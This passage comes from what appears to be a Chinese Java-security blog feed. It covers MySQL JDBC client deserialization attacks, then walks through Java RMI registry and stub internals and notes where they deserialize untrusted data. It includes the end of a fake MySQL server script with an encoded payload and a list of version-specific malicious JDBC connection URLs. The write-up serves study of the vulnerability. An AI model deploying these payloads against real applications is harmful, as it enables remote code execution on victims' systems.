class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br>                send_data(conn, payload)<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>    PORT = <span class="hljs-number">3309</span><br><br>    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <span class="hljs-comment"># 当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span><br>    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    sk.bind((HOST, PORT))<br>    sk.listen(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT))<br><br>    run()<br><br></code></pre></td></tr></table></figure>



<p><img src="https://image.sp4rks.xyz/2025/02/image-20250217121241414.png" alt="image-20250217121241414"></p>
<h1 id="payload总结"><a href="#payload总结" class="headerlink" title="payload总结"></a>payload总结</h1><p>由于Connector&#x2F;J驱动版本不同，相对应的一些payload也会出现有所不同，当然原理还是一样。</p>
<h2 id="ServerStatusDiffInterceptor触发方式-1"><a href="#ServerStatusDiffInterceptor触发方式-1" class="headerlink" title="ServerStatusDiffInterceptor触发方式"></a>ServerStatusDiffInterceptor触发方式</h2><h5 id="8-x-8-20"><a href="#8-x-8-20" class="headerlink" title="8.x &lt; 8.20"></a>8.x &lt; 8.20</h5><p>就是上面分析的，但是8.20以后进入<code>populateMapWithSessionStatusValues</code>后不会再调用getObject，因此payload失效</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">jdbc:</span>mysql://<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">3306</span>/test?autoDeserialize<span class="hljs-operator">=</span><span class="hljs-keyword">true</span>&amp;queryInterceptors<span class="hljs-operator">=</span>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure>

<h5 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h5><p>属性名不同，<code>queryInterceptors</code>换为<code>statementInterceptors</code>：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">jdbc:</span>mysql://<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">3306</span>/test?autoDeserialize<span class="hljs-operator">=</span><span class="hljs-keyword">true</span>&amp;statementInterceptors<span class="hljs-operator">=</span>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure>

<h5 id="5-1-11"><a href="#5-1-11" class="headerlink" title="&gt;&#x3D;5.1.11"></a>&gt;&#x3D;5.1.11</h5><p>包名中没有cj：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">jdbc:</span>mysql://<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">3306</span>/test?autoDeserialize<span class="hljs-operator">=</span><span class="hljs-keyword">true</span>&amp;statementInterceptors<span class="hljs-operator">=</span>com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure>

<h5 id="5-x"><a href="#5-x" class="headerlink" title="5.x &lt;&#x3D; 5.1.10"></a>5.x &lt;&#x3D; 5.1.10</h5><p>同上，但需要连接后执行查询。</p>
<h2 id="detectCustomCollations触发点"><a href="#detectCustomCollations触发点" class="headerlink" title="detectCustomCollations触发点"></a>detectCustomCollations触发点</h2><h5 id="5-1-19-6-0-6-5-1-49除外"><a href="#5-1-19-6-0-6-5-1-49除外" class="headerlink" title="5.1.19 - 6.0.6 (5.1.49除外)"></a>5.1.19 - 6.0.6 (5.1.49除外)</h5><figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">jdbc:</span>mysql://<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">3306</span>/test?detectCustomCollations<span class="hljs-operator">=</span><span class="hljs-keyword">true</span>&amp;autoDeserialize<span class="hljs-operator">=</span><span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure>

<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><p><a href="https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_PROTOCOL.html">Client&#x2F;Server Protocol</a></p>
<p><a href="https://mysql.net.cn/doc/connector-j/8.0/en/">MySQL Connector&#x2F;J Developer Guide</a></p>
<p><a href="https://www.bilibili.com/video/BV1CL4y1i7qR?vd_source=d195054a6a081ba07486dcc86c6ba707&spm_id_from=333.788.videopod.episodes&p=22">JavaWeb 教程 已完结（IDEA 2021版本）4K蓝光画质 入土到起立</a></p>
<p><a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#detectCustomCollations%E8%A7%A6%E5%8F%91%E7%82%B9">MySQL JDBC反序列化漏洞</a></p>
<p><a href="https://tttang.com/archive/1877/#toc_jdbc_1">MYSQL JDBC反序列化解析</a></p>
<p><a href="https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">WebDog必学的JDBC反序列化</a></p>
<p><a href="https://paper.seebug.org/1227/">MySQL JDBC 客户端反序列化漏洞</a></p>
<p><a href="https://www.anquanke.com/post/id/203086">MySQL JDBC 客户端反序列化漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/8159?time__1311=n4+xnD0Dc7GQDtY40KDsA3xCq7KcTw3eY5tQ4x#toc-0">小白看得懂的MySQL JDBC 反序列化漏洞分析</a></p>
<p><a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server</a></p>
<p><a href="https://mp.weixin.qq.com/s/End_5mpLd1HoT7CtU3Pa2A">JDBC 反序列化漏洞分析 &amp; POC 编写</a></p>
<p><a href="https://xz.aliyun.com/news/10371">MySQL JDBC中detectCustomCollations触发点不同版本的差异</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化-RMI服务调用流程篇</title>
    <url>/2024/12/27/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E4%B8%93%E9%A2%98-%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E7%AF%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前就学完RMI了，本来没打算写的，但是过几个月来看又有新的收获。重新记录一下吧。</p>
<ul>
<li>本环境是8u65，因为在 8u121 之后，bind rebind unbind 这三个方法只能对 localhost 进行攻击。</li>
</ul>
<h1 id="RMI基础"><a href="#RMI基础" class="headerlink" title="RMI基础"></a>RMI基础</h1><p><strong>RMI</strong> 全称 Remote Method Invocation（远程方法调用），一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p>
<p> <strong>JRMP</strong>(Java Remote Message Protocol，Java 远程消息交换协议)，RMI 依赖的通信协议，该协议为 Java 定制，要求服务端与客户端都为 Java 编写。通俗点解释，它就是一个协议，一个在TCP&#x2F;IP之上的线路层协议，一个RMI的过程，是用到JRMP这个协议去组织数据格式然后通过TCP进行传输，从而达到RMI，也就是远程方法调用。</p>
<p>RMI包括三个部分：</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241218134720127.png" alt="image-20241218134720127"></p>
<ul>
<li><strong>Server</strong>：提供远程服务的程序，包含了实际的远程对象实现，服务器程序在启动时需要创建远程对象实例并使用Naming.rebind()方法将其与指定的名称绑定到RMI Registry，当接受到来自客户端的远程调用请求时，服务器会执行相应的操作并返回结果。</li>
<li><strong>Client</strong>：发起远程方法调用的程序，客户端通过调用Naming.lookup()方法使用字符串形式的对象名从RMI Registry获取远程对象的Stub，获得Stub后客户端就可以像调用本地对象一样调用远程对象的方法</li>
<li>**Registry(注册中心)**：运行在服务器上的一个简单的名称服务，用于管理远程对象的注册和查找，RMI Registry通常在独立的进程中运行(默认端口为1099)，服务器在启动时会注册其提供的远程对象使得客户端能够通过名称访问这些对象</li>
</ul>
<p>其实很好理解，当客户端调用远程的方法的时候它并不知道服务端对象在哪个端口，所以引入了Registry，它有默认的端口(1099)，</p>
<p>Server 端向 Registry 注册服务，Client 端从 Registry 获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</p>
<p>备注：RMI采用代理来负责客户与远程对象之间通过Socket进行通信的细节，RMI框架为远程对象分别生成了客户端代理和服务器端代理，位于客户端的代理必被称为存根(Stub)，位于服务器端的代理类被称为骨架(Skeleton)。</p>
<h1 id="RMI简单实现"><a href="#RMI简单实现" class="headerlink" title="RMI简单实现"></a>RMI简单实现</h1><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><ol>
<li>先定义一个远程接口，需要继承Remote(固定写法)，同时有个sayHello()接口方法。此远程接口要求作用域为 public。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>定义IRemoteObj的实现类。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjimpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObjimpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>现在可以被远程调用的对象被创建好了，接下来改如何调用呢？Java RMI 设计了一个 Registry 的思想（注意：通常情况下，Registry 和Server会部署在同一台机器上，但 RMI 也支持将它们分开部署。所以也提供了两种调用方法，将会在下面的代码体现），很好理解，我们可以使用注册表来查找一个远端对象的引用，更通俗的来讲，这个就是一个 RMI 电话本，我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）。</p>
<p>这种电话本的思想，由 <code>java.rmi.registry.Registry</code> 和 <code>java.rmi.Naming</code> 来实现。这里分别来说说这两个东西。</p>
<p>先来说说 <code>java.rmi.Naming</code>，这是一个 final 类，提供了在远程对象注册表（Registry）中存储和获取远程对象引用的方法，这个类提供的每个方法都有一个 URL 格式的参数，格式如下：<code> //host:port/name</code>：</p>
<ul>
<li>host 表示注册表所在的主机</li>
<li>port 表示注册表接受调用的端口号，默认为 1099</li>
<li>name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字</li>
</ul>
<p>Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。也就是说，Naming 是一个用来对注册表进行操作的类。而这些方法的具体实现，其实是调用 <code>LocateRegistry.getRegistry</code> 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的。</p>
<p>那就说到了 <code>java.rmi.registry.Registry</code> 接口，这个接口在 RMI 下有两个实现类，分别是 RegistryImpl 以及 RegistryImpl_Stub。</p>
<ul>
<li>我们通常使用 <code>LocateRegistry.createRegistry()</code> 方法来创建注册中心：</li>
</ul>
<ol start="3">
<li>注册远程对象，启动了一个1099端口的Registry注册服务，并把IRemoteObj接口的实现RemoteObjimpl暴露和注册到Registry注册服务。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">RemoteObjimpl</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjimpl</span>();<br>        <span class="hljs-comment">//写法1 通过网络进行远程调用  使用RegistryImpl_Stub远程调用</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, remoteObj);<br>        <span class="hljs-comment">//写法2 直接在本地进行绑定操作  使用RegistryImpl.bind 方法</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        registry.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ol>
<li>具有同样的接口(但不需要实现)。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>连接到注册中心，获取远程对象，调用远程方法。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj)registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>启动服务端再启动客户端，我们发现服务端和客户端都将hello大写。</p>
<p>这其中的过程是：</p>
<p>当<strong>服务端</strong>启动时，启动 <strong>RMI 注册中心</strong>，将远程对象<code>RemoteObjImpl</code> 注册到该注册中心，并将其 <strong>stub</strong> 暴露。<strong>stub</strong> 包含了远程对象的 IP 和端口信息。<strong>客户端</strong>通过连接 RMI 注册中心，查询并获得该远程对象的 <strong>stub</strong>。<strong>客户端</strong>通过这个 <strong>stub</strong> 发起远程方法调用。 </p>
<p><strong>客户端</strong>通过 <code>lookup</code> 方法获取到 <strong>stub</strong> 后，实际上获得了指向远程对象的代理。该代理包含了远程对象的 IP 地址和端口信息，所以客户端可以通过 <strong>stub</strong> 发起远程方法调用。调用过程中会先经过<strong>Skeleton</strong>，随后方法参数通过 <strong>序列化</strong> 转换为字节流并通过 <strong>JRMP 协议</strong> 发送到<strong>服务端</strong>。<strong>服务端</strong>接收到字符流后<strong>反序列化</strong>，执行方法并将结果HELLO的<strong>序列化</strong>字节流通过 <strong>JRMP 协议</strong> 返回，<strong>客户端</strong>再通过 <strong>反序列化</strong> 获得返回的数据并输出结果。</p>
<p>(这里借用su18师傅的图来说明整个过程)</p>
<p><img src="https://image.sp4rks.xyz/2024/12/1633059061409.png" alt="1633059061409"></p>
<h1 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h1><h2 id="创建远程对象"><a href="#创建远程对象" class="headerlink" title="创建远程对象"></a>创建远程对象</h2><p>我们通过<code>RemoteObjimpl remoteObj = new RemoteObjimpl();</code>创建了一个远程对象，这个对象继承了 <strong>UnicastRemoteObject</strong>，这个类用于使用 JRMP 协议 export 远程对象，并获取与远程对象进行通信的 Stub。我们可以看一下具体的流程。</p>
<p>在初始化时，调用其 <code>exportObject</code> 方法来 发布RemoteObjimpl这个远程对象。我们来看这个静态函数。第一个参数是 obj 对象，也就是我们实例化的对象，第二个参数是 <code>new UnicastServerRef(port)</code>，它主要封装了服务端与客户端通信的细节。我们跟进 <code>exportObject</code> 方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220110758484.png" alt="image-20241220110758484"></p>
<p>继续跟进我们发现服务端创建远程服务这一步居然出现了 <strong>Stub</strong> 的创建，其实原理是这个样子的，RMI 先在服务端创建一个 Stub，再把 Stub 传到 <strong>RMI Registry</strong> 中，最后让 RMI Client 去获取 Stub。可以看一下Stub是怎么产生的。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220110902678.png" alt="image-20241220110902678"></p>
<p>这其中使用 <code>sun.rmi.server.Util#createProxy()</code> 一看就知道是创建代理，这个方法使用 RemoteObjectInvocationHandler 来为 <strong>RemoteObjectlmpl</strong> 实现的 IRemoteObj接口创建动态代理。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220111039493.png" alt="image-20241220111039493"></p>
<p>然后创建 <code>sun.rmi.transport.Target</code> 对象，可以看到Target 对象封装了我们远程执行方法和生成的动态代理类（Stub）。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220111159951.png" alt="image-20241220111159951"></p>
<p>并调用 <code>LiveRef#exportObject</code> 接着调用 <code>sun.rmi.transport.tcp.TCPEndpoint#exportObject</code> 监听本地端口。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220111259879.png" alt="image-20241220111259879"></p>
<p>然后调用<code> sun.rmi.transport.tcp.TCPTransport#exportObject</code>方法将 Target 实例注册到 <strong>ObjectTable</strong> 中。<strong>ObjectTable</strong> 用来管理所有发布的服务实例 Target，<strong>ObjectTable</strong> 提供了根据 <strong>ObjectEndpoint</strong> 和 <strong>Remote</strong> 实例两种方式查找 Target 的方法（不同参数的 getTarget 方法）。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220111410861.png" alt="image-20241220111410861"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241224112759543.png" alt="image-20241224112759543"></p>
<h2 id="创建注册中心"><a href="#创建注册中心" class="headerlink" title="创建注册中心"></a>创建注册中心</h2><p><code>LocateRegistry.createRegistry(1099)</code>，创建了注册中心，跟进。</p>
<p>可以看到 <code>createRegistry </code>方法实际 new 了一个 RegistryImpl 对象。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220112741229.png" alt="image-20241220112741229"></p>
<p><strong>RegistryImpl</strong> 的构造方法中创建 LiveRef 对象，然后创建 <strong>UnicastServerRef</strong> 对象，最后调用 <code>setup</code> 进行配置。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220112845940.png" alt="image-20241220112845940"></p>
<p>在 <code>setup</code> 方法中，使用 <strong>UnicastServerRef</strong> 的 <code>exportObject </code>方法发布对象，和创建远程对象的时候是一样的，但是这次发布的是 <strong>RegistryImpl</strong> 这个对象。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220115543294.png" alt="image-20241220115543294"></p>
<p>在 <code>exportObject</code> 方法中，重要的一步就是使用 <code>Util.createProxy()</code> 来创建动态代理，之前提到对远程对象使用 <strong>RemoteObjectInvocationHandler</strong> 来创建，但是之前有一个 <strong>stubClassExists</strong> 的判断，创建远程对象的时候直接跳过去了，这里是可以进入判断。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220115744945.png" alt="image-20241220115744945"></p>
<p>大概意思就是找有没有<code>_Stub</code>结尾的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">stubClassExists</span><span class="hljs-params">(Class&lt;?&gt; remoteClass)</span> &#123;<br>     <span class="hljs-keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;<br>         <span class="hljs-keyword">try</span> &#123;<br>             Class.forName(remoteClass.getName() + <span class="hljs-string">&quot;_Stub&quot;</span>,<br>                           <span class="hljs-literal">false</span>,<br>                           remoteClass.getClassLoader());<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>         &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>             withoutStubs.put(remoteClass, <span class="hljs-literal">null</span>);<br>         &#125;<br>     &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>如果需要创建代理的类在本地有 <code>_Stub</code> 的类，则直接使用 <code>createStub</code> 方法反射调用 stub 类的构造方法创建类实例。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220115831241.png" alt="image-20241220115831241"></p>
<p>为什么会是 <strong>RegistryImpl_Stub</strong> 这个文件呢？因为由于是 <strong>RegistryImpl</strong> 这个类，所以系统会找到 <strong>RegistryImpl_Stub</strong> 这个类并进行实例化，<strong>RegistryImpl_Stub</strong> 继承了 <strong>RemoteStub</strong> ，实现了 <strong>Registry</strong>。这个类实现了 <code>bind/list/lookup/rebind/unbind</code> 等 <strong>Registry</strong> 定义的方法，全部是通过序列化和反序列化来实现的。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220120028974.png" alt="image-20241220120028974"></p>
<p>创建完代理类之后，调用 setSkeleton 方法调用 <code>Util.createSkeleton()</code> 方法创建 skeleton。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220120123846.png" alt="image-20241220120123846"></p>
<p>其实就是反射实例化 <strong>RegistryImpl_Skel</strong> 这个类并引用在 UnicastServerRef 的 <code>private transient Skeleton skel;</code> 中。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241224165906564.png" alt="image-20241224165906564"></p>
<p>然后又调用<code> sun.rmi.transport.tcp.TCPTransport#exportObject</code>方法将 Target 实例注册到 <strong>ObjectTable</strong> 中。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121224133.png" alt="image-20241220121224133"></p>
<p>最后发布的时候我们有三个对象，我们自己建的<strong>RemoteObjlmpl(是个代理)<strong>、</strong>RegistryImpl_Stub</strong>、<strong>DGClmpl_Stub</strong>（DGC—— 分布式垃圾回收，我们现在只用知道它是自动创建的就行）</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121023302.png" alt="image-20241220121023302"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121036739.png" alt="image-20241220121036739"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121053100.png" alt="image-20241220121053100"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121108831.png" alt="image-20241220121108831"></p>
<p>随后将整个<strong>target</strong>发布出去</p>
<p>总结一下就是开了几个远程服务，远程服务对象使用动态代理，注册中心使用 <strong>RegistryImpl_Stub</strong>，同时还创建了 <strong>RegistryImpl_Skel</strong>。注册中心端口是固定了，另外两个端口是不固定的，随机产生的。</p>
<h2 id="服务注册-1"><a href="#服务注册-1" class="headerlink" title="服务注册"></a>服务注册</h2><p>其实就是 bind 的过程，直接调用<code>sun.rmi.registry.RegistryImpl#bind</code>进行绑定，就是将 Remote 对象和名称 String 放在成员变量 bindings 中，bindings是一个Hashtable 对象，接着<code>bindings.put</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241220121720353.png" alt="image-20241220121720353"></p>
<p>​	</p>
<h1 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h1><p>使用远程方法调用时会涉及参数的传递和执行结果的返回，参数或者返回值可以是基本数据类型也可以是对象的引用，所以这些需要被传输的对象必须可以被序列化，这就要求相应的类必须实现java.io.Serializable接口并且客户端的serialVersionUID字段要与服务器端保持一致。<br>JVM之间通信时RMI，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理，Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法，Stub中包含了远程对象的定位信息，例如：Socket端口、服务端主机地址等，同时也实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250103122941729.png" alt="image-20250103122941729"></p>
<h2 id="客户端请求注册中心-客户端"><a href="#客户端请求注册中心-客户端" class="headerlink" title="客户端请求注册中心-客户端"></a>客户端请求注册中心-客户端</h2><p>这里其实是通过调用<strong>本地创建</strong>的 <strong>RegistryImpl_Stub</strong> 对象，跟创建注册中心的流程一样的，随后调用<code>lookup</code>方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225110936113.png" alt="image-20241225110936113"></p>
<p>在调用其<code>lookup</code>方法时，会向注册中心传递序列化的 name (所以注册中心也一定有一个反序列化的点)，然后将 Registry 端回传的结果反序列化。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225111855102.png" alt="image-20241225111855102"></p>
<p>另外还需要注意的一个点是<code>invoke</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225112438854.png" alt="image-20241225112438854"></p>
<p>它实际调用 的是<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>，这个方法中又调用了<strong>sun.rmi.transport.StreamRemoteCall#executeCall。</strong>如果你是2号异常，他会通过反序列化来获取流里的对象（也就是说如果注册中心返回一个恶意的流，那客户端也会被攻击）这个点更隐蔽，结论就是，<strong>RegistryImpl_Stub</strong>的方法中调用了<code>invoke</code>方法，都有可能会被攻击</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225112649941.png" alt="image-20241225112649941"></p>
<h2 id="客户端请求注册中心-注册中心"><a href="#客户端请求注册中心-注册中心" class="headerlink" title="客户端请求注册中心-注册中心"></a>客户端请求注册中心-注册中心</h2><p>注册中心端会走到<strong>RegistryImpl_Skel</strong> 的 <code>dispatch</code> 方法，<code>lookup</code> 方法对应的值是 2 ，调用 <strong>RegistryImpl</strong> 的 <code>lookup</code>方法，然后将查询到的结果 writeObject 到流中</p>
<p>至于为什么找到<code>dispatch</code>方法过程比较繁琐，推荐大家看这一期视频<a href="https://www.bilibili.com/video/BV1L3411a7ax?spm_id_from=333.788.videopod.episodes&vd_source=d195054a6a081ba07486dcc86c6ba707&p=6">Java反序列化RMI专题-没有人比我更懂RMI</a></p>
<p>case2也就是我们客户端调用的lookup方法，这里对应的也就是我们传入的name字段，这里是通过反序列化读出来的</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225120047665.png" alt="image-20241225120047665"></p>
